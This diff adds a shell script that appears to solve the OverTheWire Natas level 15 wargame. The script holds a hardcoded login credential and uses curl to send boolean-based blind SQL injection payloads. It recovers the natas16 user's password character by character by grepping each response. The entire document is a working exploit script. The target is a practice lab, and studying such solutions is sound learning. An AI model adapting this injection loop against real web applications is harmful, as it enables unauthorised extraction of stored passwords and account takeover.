@@ -1,0 +1,28 @@
+#!/bin/sh
+
+probe () {
+    curl -su natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J "http://natas15.natas.labs.overthewire.org/index.php?username=%22%20or%20ascii(substring((SELECT%20password%20from%20users%20where%20username=%22natas16%22),$1,1))=$2%20and%20username%20=%20%22natas16" | grep -q "doesn't"
+}
+
+for i in $(seq 1 32); do
+  for j in $(seq 48 57); do
+    if ! probe "$i" "$j"; then
+      echo "$j" | awk '{printf("%c",$1)}'
+      break
+    fi
+  done
+
+  for j in $(seq 65 90); do
+    if ! probe "$i" "$j"; then
+      echo "$j" | awk '{printf("%c",$1)}'
+      break
+    fi
+  done
+
+  for j in $(seq 97 122); do
+    if ! probe "$i" "$j"; then
+      echo "$j" | awk '{printf("%c",$1)}'
+      break
+    fi
+  done
+done
